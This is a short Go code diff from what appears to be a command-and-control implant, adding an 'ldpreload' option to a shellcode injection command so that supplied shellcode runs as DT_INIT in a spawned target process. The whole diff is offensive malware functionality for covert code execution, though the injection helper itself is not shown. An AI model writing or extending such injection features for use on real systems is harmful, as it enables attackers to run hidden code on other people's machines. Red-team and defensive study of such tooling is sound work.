@@ -47,6 +47,14 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 		return errorResult("Error: Shellcode data is empty")
 	}
 
+	if strings.EqualFold(params.Action, "ldpreload") {
+		info, err := ldpreloadInject(shellcode, params.Target)
+		if err != nil {
+			return errorf("[!] LD_PRELOAD injection failed: %v", err)
+		}
+		return successResult(fmt.Sprintf("[+] LD_PRELOAD injection: %s\n[*] Shellcode runs as DT_INIT in spawned process\n", info))
+	}
+
 	if params.PID <= 0 {
 		return errorResult("Error: Invalid PID specified")
 	}
